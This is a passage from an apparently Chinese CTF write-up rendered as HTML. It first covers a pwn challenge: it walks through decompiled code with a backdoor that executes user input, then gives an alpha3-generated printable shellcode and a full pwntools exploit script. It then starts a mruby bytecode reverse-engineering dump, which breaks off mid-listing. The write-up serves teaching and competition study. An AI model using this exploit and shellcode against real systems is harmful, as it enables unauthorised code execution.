!strcasecmp(s1, <span class="string">&quot;opt&quot;</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v7 )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;error.&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">5</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      v7 = atoi(nptr);<span class="comment">// 若在我们的输入中找到了&#x27;opt&#x27;字符串，将其转为int整型储存在v7</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( strcasecmp(s1, <span class="string">&quot;msg&quot;</span>) )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;error.&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">4</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( <span class="built_in">strlen</span>(nptr) &lt;= <span class="number">1</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;error.&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">5</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      v9 = <span class="built_in">strlen</span>(nptr) - <span class="number">1</span>;</span><br><span class="line">      <span class="keyword">if</span> ( dest )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;error.&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">5</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      dest = <span class="built_in">calloc</span>(v9 + <span class="number">8</span>, <span class="number">1uLL</span>);</span><br><span class="line">      <span class="keyword">if</span> ( v9 &lt;= <span class="number">0</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;error.&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">5</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="built_in">memcpy</span>(dest, nptr, v9);<span class="comment">// 若在输入中找到了&#x27;msg&#x27;，则将&#x27;:&#x27;后边的内容复制到dest里</span></span><br><span class="line">    &#125;</span><br><span class="line">    ++v8;<span class="comment">// 计数器+1，重复以上步骤</span></span><br><span class="line">  &#125;</span><br><span class="line">  *our_input = <span class="number">0</span>;</span><br><span class="line">  sa = our_input + <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">if</span> ( *sa == <span class="number">10</span> )</span><br><span class="line">    *sa = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">switch</span> ( v7 )<span class="comment">// 对应以上循环里的&#x27;opt&#x27;</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">      backdoor(dest);<span class="comment">// 对应以上循环里的&#x27;msg&#x27;</span></span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">      sub_EFE(dest);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">      root(dest);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;error.&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">6</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v13;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接下来再来看看<code>root</code>函数里有什么：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 __fastcall <span class="title function_">sub_CBD</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+14h] [rbp-1Ch]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v3; <span class="comment">// [rsp+18h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="built_in">strlen</span>(a1); ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( !<span class="built_in">isprint</span>(a1[i]) &amp;&amp; a1[i] != <span class="number">10</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;oh!&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(a1, <span class="string">&quot;ro0t&quot;</span>) )<span class="comment">// a1即在menu中传入的dest</span></span><br><span class="line">  &#123;</span><br><span class="line">    unk_202028 = <span class="number">1</span>;<span class="comment">// 将两个全局变量置为1，在backdoor函数里有用</span></span><br><span class="line">    unk_202024 = <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    unk_202028 = <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>再来看下<code>backdoor</code>函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 __fastcall <span class="title function_">sub_DA8</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v1; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">size_t</span> v2; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+14h] [rbp-2Ch]</span></span><br><span class="line">  <span class="type">void</span> *dest; <span class="comment">// [rsp+18h] [rbp-28h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v6; <span class="comment">// [rsp+28h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  v6 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="built_in">strlen</span>(a1); ++i )<span class="comment">// 检测menu中传入的dest内容是否可打印</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( !<span class="built_in">isprint</span>(a1[i]) &amp;&amp; a1[i] != <span class="number">10</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;oh!&quot;</span>);<span class="comment">// 不可打印就报错</span></span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( unk_202028 != <span class="number">1</span> )<span class="comment">//检测是否root</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;oh!&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( unk_202024 )<span class="comment">//检测是否root</span></span><br><span class="line">  &#123;</span><br><span class="line">    v1 = getpagesize();<span class="comment">// 获取一页的大小</span></span><br><span class="line">    dest = mmap(&amp;loc_FFE + <span class="number">2</span>, v1, <span class="number">7</span>, <span class="number">34</span>, <span class="number">0</span>, <span class="number">0LL</span>);<span class="comment">// 申请一片可读可写可执行的空间</span></span><br><span class="line">    v2 = <span class="built_in">strlen</span>(a1);</span><br><span class="line">    <span class="built_in">memcpy</span>(dest, a1, v2);<span class="comment">//将dest内容复制至该空间</span></span><br><span class="line">    (dest)();<span class="comment">//直接执行dest内容</span></span><br><span class="line"><span class="comment">// text:0000000000000EC9                 call    rdx //</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(a1);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v6;</span><br></pre></td></tr></table></figure><p>总的来说，是一道编写可见字符串的<code>shellcode</code>题型，我们利用<code>alpha3</code>工具便可生成基于<code>rdx</code>的可打印<code>shellcode</code>：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">giantbranch@ubuntu:~/buupwn/mrctf/alpha3$ python ./ALPHA3.py x64 ascii mixedcase rdx --input=<span class="string">&quot;shellcode&quot;</span></span><br><span class="line">Rh0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a071N00</span><br></pre></td></tr></table></figure><p>有如下 exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io=process(<span class="string">&quot;./login&quot;</span>)</span><br><span class="line"><span class="comment">#io=remote(&quot;39.105.43.168&quot;,13321)</span></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="comment">#context.log_level=&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment">#gdb.attach(io,&#x27;b *$rebase(0x01346)&#x27;)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">io.recvuntil(<span class="string">&quot;&gt;&gt;&gt; &quot;</span>)</span><br><span class="line">io.send(<span class="string">&quot;opt:1\nmsg:ro0tt\n\n:1&quot;</span>)</span><br><span class="line"></span><br><span class="line">shellcode=<span class="string">&#x27;Rh0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a071N00&#x27;</span></span><br><span class="line"><span class="comment">#gdb.attach(io,&#x27;b *$rebase(0xEC9)&#x27;)</span></span><br><span class="line">io.send(<span class="string">&quot;opt:2\nmsg:&quot;</span>+shellcode+<span class="string">&quot;\n\n:2&quot;</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h2 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h2><h3 id="baby-code（未解出"><a href="#baby-code（未解出" class="headerlink" title="baby_code（未解出"></a>baby_code（未解出</h3><p><a href="https://www.anquanke.com/post/id/253572">先放篇大佬的文章在这里——mruby字节码逆向入门</a></p><p><a href="https://wkr.moe/ctf/787.html#Reverse">Wankko Ree の Blog</a></p><p><code>.mrb</code>可知是<code>mruby</code>解释器生成的字节码。从其文件头字节码可以看出使用的<code>mruby</code>版本</p><img src="https://m.360buyimg.com/babel/jfs/t1/106673/39/28401/24652/62947e45Efafd20a2/7dbea9ebee9e9003.png" style="zoom:80%;" /><p>利用<code>./mruby -v -b *.mrb  </code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br></pre></td><td class="code"><pre><span class="line">giantbranch@ubuntu:~/ciscn2022/mruby/mruby/bin$ ./mruby -v -b babycode.mrb </span><br><span class="line">mruby <span class="number">3.1</span><span class="number">.0</span> (<span class="number">2022</span><span class="number">-05</span><span class="number">-12</span>)</span><br><span class="line">irep <span class="number">0x18b1a90</span> nregs=<span class="number">5</span> nlocals=<span class="number">2</span> pools=<span class="number">1</span> syms=<span class="number">5</span> reps=<span class="number">2</span> ilen=<span class="number">55</span></span><br><span class="line">local variable names:</span><br><span class="line">  R1:p</span><br><span class="line">      <span class="number">000</span> LOADNILR2</span><br><span class="line">      <span class="number">002</span> LOADNILR3</span><br><span class="line">      <span class="number">004</span> CLASSR2:Crypt<span class="comment">// 定义Crypt类</span></span><br><span class="line">      <span class="number">007</span> EXECR2I(<span class="number">0</span>:<span class="number">0x18b3a80</span>)<span class="comment">// 执行0x18b3a80初始化</span></span><br><span class="line">      <span class="number">010</span> TCLASSR2</span><br><span class="line">      <span class="number">012</span> METHODR3I(<span class="number">1</span>:<span class="number">0x18b4320</span>)</span><br><span class="line">      <span class="number">015</span> DEFR2:check<span class="comment">// 并添上check函数</span></span><br><span class="line">      <span class="number">018</span> SSENDR2:getsn=<span class="number">0</span><span class="comment">// gets输入</span></span><br><span class="line">      <span class="number">022</span> SENDR2:chompn=<span class="number">0</span></span><br><span class="line">      <span class="number">026</span> MOVER1R2; R1:p</span><br><span class="line">      <span class="number">029</span> MOVER3R1; R1:p</span><br><span class="line">      <span class="number">032</span> SSENDR2:checkn=<span class="number">1</span><span class="comment">// check(R2)检测输入</span></span><br><span class="line">      <span class="number">036</span> JMPNOTR2<span class="number">050</span></span><br><span class="line">      <span class="number">040</span> STRINGR3L(<span class="number">0</span>); yes</span><br><span class="line">      <span class="number">043</span> SSENDR2:<span class="built_in">puts</span>n=<span class="number">1</span></span><br><span class="line">      <span class="number">047</span> JMP<span class="number">052</span></span><br><span class="line">      <span class="number">050</span> LOADNILR2</span><br><span class="line">      <span class="number">052</span> RETURNR2</span><br><span class="line">      <span class="number">054</span> STOP</span><br><span class="line"></span><br><span class="line">irep <span class="number">0x18b3a80</span> nregs=<span class="number">3</span> nlocals=<span class="number">1</span> pools=<span class="number">0</span> syms=<span class="number">1</span> reps=<span class="number">1</span> ilen=<span class="number">12</span></span><br><span class="line">      <span class="number">000</span> LOADNILR1</span><br><span class="line">      <span class="number">002</span> LOADNILR2</span><br><span class="line">      <span class="number">004</span> CLASSR1:CIPHER</span><br><span class="line">      <span class="number">007</span> EXECR1I(<span class="number">0</span>:<span class="number">0x18b3b50</span>)<span class="comment">// 执行了0x18b3b50</span></span><br><span class="line">      <span class="number">010</span> RETURNR1</span><br><span class="line"></span><br><span class="line">irep <span class="number">0x18b3b50</span> nregs=<span class="number">3</span> nlocals=<span class="number">1</span> pools=<span class="number">0</span> syms=<span class="number">6</span> reps=<span class="number">4</span> ilen=<span class="number">55</span></span><br><span class="line">      <span class="number">000</span> LOADI32R1<span class="number">305419896</span></span><br><span class="line">      <span class="number">006</span> SETCONSTXXR1<span class="comment">// 定义常量 XX=305419896</span></span><br><span class="line">      <span class="number">009</span> LOADIR1<span class="number">16</span></span><br><span class="line">      <span class="number">012</span> SETCONSTYYR1<span class="comment">// 定义常量 YY=16</span></span><br><span class="line">      <span class="number">015</span> LOADSELFR1</span><br><span class="line">      <span class="number">017</span> SCLASSR1</span><br><span class="line">      <span class="number">019</span> METHODR2I(<span class="number">0</span>:<span class="number">0x18b3c60</span>)<span class="comment">// 在0x18b3c60处定义了encrypt函数 </span></span><br><span class="line">      <span class="number">022</span> DEFR1:encrypt</span><br><span class="line">      <span class="number">025</span> TCLASSR1</span><br><span class="line">      <span class="number">027</span> METHODR2I(<span class="number">1</span>:<span class="number">0x18b3d00</span>)<span class="comment">// 在0x18b3d00处也定义了encrypt函数,估计重载</span></span><br><span class="line">      <span class="number">030</span> DEFR1:encrypt</span><br><span class="line">      <span class="number">033</span> SSENDR1:privaten=<span class="number">0</span></span><br><span class="line">      <span class="number">037</span> TCLASSR1</span><br><span class="line">      <span class="number">039</span> METHODR2I(<span class="number">2</span>:<span class="number">0x18b4020</span>)</span><br><span class="line">      <span class="number">042</span> DEFR1:to_key<span class="comment">// 在0x18b4020处定义了to_key函数</span></span><br><span class="line">      <span class="number">045</span> TCLASSR1</span><br><span class="line">      <span class="number">047</span> METHODR2I(<span class="number">3</span>:<span class="number">0x18b40f0</span>)</span><br><span class="line">      <span class="number">050</span> DEFR1:enc_one<span class="comment">// 在0x18b40f0处定义了enc_one函数</span></span><br><span class="line">      <span class="number">053</span> RETURNR1</span><br><span class="line"></span><br><span class="line">irep <span class="number">0x18b3c60</span> nregs=<span class="number">9</span> nlocals=<span class="number">5</span> pools=<span class="number">0</span> syms=<span class="number">3</span> reps=<span class="number">0</span> ilen=<span class="number">29</span></span><br><span class="line">local variable names:</span><br><span class="line">  R1:t</span><br><span class="line">  R2:p</span><br><span class="line">  R3:&amp;</span><br><span class="line">  R4:cip</span><br><span class="line">      <span class="number">000</span> ENTER<span class="number">2</span>:<span class="number">0</span>:<span class="number">0</span>:<span class="number">0</span>:<span class="number">0</span>:<span class="number">0</span>:<span class="number">0</span> (<span class="number">0x80000</span>)</span><br><span class="line">      <span class="number">004</span> GETCONSTR5CIPHER</span><br><span class="line">      <span class="number">007</span> SENDR5:newn=<span class="number">0</span></span><br><span class="line">      <span class="number">011</span> MOVER4R5; R4:cip</span><br><span class="line">      <span class="number">014</span> MOVER5R4; R4:cip</span><br><span class="line">      <span class="number">017</span> MOVER6R1; R1:t</span><br><span class="line">      <span class="number">020</span> MOVER7R2; R2:p</span><br><span class="line">          <span class="comment">//传参为t,p,为另一个encrypt做准备</span></span><br><span class="line">      <span class="number">023</span> SENDR5:encryptn=<span class="number">2</span></span><br><span class="line">      <span class="number">027</span> RETURNR5</span><br><span class="line"></span><br><span class="line">irep <span class="number">0x18b3d00</span> nregs=<span class="number">16</span> nlocals=<span class="number">11</span> pools=<span class="number">1</span> syms=<span class="number">8</span> reps=<span class="number">1</span> ilen=<span class="number">346</span></span><br><span class="line">local variable names:</span><br><span class="line">  R1:t</span><br><span class="line">  R2:p</span><br><span class="line">  R3:&amp;</span><br><span class="line">  R4:key</span><br><span class="line">  R5:c</span><br><span class="line">  R6:n</span><br><span class="line">  R7:num1</span><br><span class="line">  R8:num2</span><br><span class="line">  R9:enum1</span><br><span class="line">  R10:enum2</span><br><span class="line">      <span class="number">000</span> ENTER<span class="number">2</span>:<span class="number">0</span>:<span class="number">0</span>:<span class="number">0</span>:<span class="number">0</span>:<span class="number">0</span>:<span class="number">0</span> (<span class="number">0x80000</span>)</span><br><span class="line">      <span class="number">004</span> MOVER12R2; R2:p</span><br><span class="line">      <span class="number">007</span> SSENDR11:to_keyn=<span class="number">1</span></span><br><span class="line">      <span class="number">011</span> MOVER4R11; R4:key</span><br><span class="line">          <span class="comment">//key=to_key(p)</span></span><br><span class="line">      <span class="number">014</span> ARRAYR5R5<span class="number">0</span>; R5:c</span><br><span class="line">      <span class="number">017</span> LOADI_0R6; R6:n</span><br><span class="line">          <span class="comment">//定义c=[]，n=0</span></span><br><span class="line">      <span class="number">019</span> MOVER11R6; R6:n</span><br><span class="line">      <span class="number">022</span> MOVER12R1; R1:t</span><br><span class="line">      <span class="number">025</span> SENDR12:lengthn=<span class="number">0</span></span><br><span class="line">      <span class="number">029</span> LTR11R12</span><br><span class="line">      <span class="number">031</span> JMPNOTR11<span class="number">327</span></span><br><span class="line">          <span class="comment">//接着是一个循环</span></span><br><span class="line">      <span class="number">035</span> MOVER11R1; R1:t</span><br><span class="line">      <span class="number">038</span> MOVER12R6; R6:n</span><br><span class="line">      <span class="number">041</span> GETIDXR11R12</span><br><span class="line">      <span class="number">043</span> SENDR11:ordn=<span class="number">0</span></span><br><span class="line">      <span class="number">047</span> SENDR11:to_in=<span class="number">0</span></span><br><span class="line">      <span class="number">051</span> LOADIR12<span class="number">24</span> </span><br><span class="line">      <span class="number">054</span> SENDR11:&lt;&lt;n=<span 